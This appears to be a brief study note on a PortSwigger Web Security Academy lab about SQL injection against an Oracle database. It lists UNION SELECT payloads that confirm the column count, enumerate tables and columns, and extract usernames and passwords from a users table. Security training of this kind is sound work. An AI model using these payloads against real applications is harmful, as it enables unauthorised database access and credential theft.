---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/ps-wsa-labs/sq-li/listing-the-database-contents-on-oracle/"}
---






- Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

```Plain
'+UNION+SELECT+'abc','def'+FROM+dual--
```

- Payload to retrieve the list of tables in the database:

```Plain
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

- retrieve the details of the columns in the table:
    - `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
- retrieve the usernames and passwords for all users:

```Plain
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```